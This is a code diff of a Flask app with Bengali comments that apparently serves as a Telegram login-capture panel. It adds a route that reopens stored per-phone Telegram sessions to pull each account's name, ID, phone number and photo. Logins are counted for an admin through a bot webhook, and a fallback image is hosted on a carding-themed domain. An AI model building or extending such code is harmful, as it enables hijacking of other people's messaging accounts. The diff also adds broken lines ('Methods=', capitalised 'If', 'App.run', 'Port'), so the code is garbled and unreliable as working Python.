@@ -77,7 +77,6 @@ def dashboard_page():
     return "dashboard.html not found", 404
 
 
-# নতুন যোগ করা প্রোফাইল পেজ রাউট
 @app.route('/profile.html', methods=['GET'])
 def profile_page():
     if os.path.exists('profile.html'):
@@ -194,6 +193,52 @@ def verify_code():
         return jsonify({"status": "error", "message": str(e)}), 400
 
 
+# ইউজারের টেলিগ্রাম প্রোফাইল ডাটা ফেচ করার জন্য নতুন API রাউট
+@app.route('/get-user-profile', methods=['POST'])
+def get_user_profile():
+    data = request.get_json(silent=True) or {}
+    phone = str(data.get('phone', '')).strip()
+    
+    if not phone:
+        return jsonify({"status": "error", "message": "Phone required"}), 400
+
+    try:
+        session_name = f"session_{phone.replace('+', '')}"
+        
+        async def _fetch():
+            client = Client(
+                session_name,
+                api_id=API_ID,
+                api_hash=API_HASH,
+                in_memory=True
+            )
+            await client.connect()
+            me = await client.get_me()
+            
+            photo_url = None
+            async for photo in client.get_chat_photos("me", limit=1):
+                file_path = await client.download_media(photo.file_id, file_name="static/profile.jpg")
+                photo_url = "/" + file_path
+
+            await client.disconnect()
+            
+            return {
+                "name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
+                "username": f"@{me.username}" if me.username else "No Username",
+                "id": me.id,
+                "phone": me.phone_number or phone,
+                "bio": "Telegram Verified Member",
+                "photo": photo_url or "https://carder.top/imagens/1791918460640-323067073.jpg"
+            }
+
+        profile_data = run_async(_fetch())
+        return jsonify({"status": "success", "profile": profile_data})
+
+    except Exception as e:
+        print("PROFILE FETCH ERROR:", traceback.format_exc())
+        return jsonify({"status": "error", "message": str(e)}), 400
+
+
 # টেলিগ্রাম বটের ইনকামিং কমান্ড হ্যান্ডেল করার জন্য Webhook রুট
 @app.route(f'/{BOT_TOKEN}', methods=['POST'])
 def telegram_webhook():
@@ -205,7 +250,6 @@ def telegram_webhook():
             user_id = message["from"]["id"]
             text = message.get("text", "").strip()
 
-            # শুধু নির্দিষ্ট অ্যাডমিন আইডি থেকে কমান্ড দিলে উত্তর দেবে
             if text == "/stats" or text == "/start":
                 if user_id == ADMIN_ID or str(chat_id) == str(OWNER_CHAT_ID):
                     reply_msg = (
@@ -219,11 +263,11 @@ def telegram_webhook():
     return "OK", 200
 
 
-@app.route('/stats', methods=['GET'])
+@app.route('/stats', Methods=['GET'])
 def get_stats():
     return jsonify({"total_users_logged_in": total_logged_in_users})
 
 
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, threaded=True)
+If __name__ == '__main__':
+    Port = int(os.environ.get('PORT', 5000))
+    App.run(host='0.0.0.0', port=port, threaded=True)
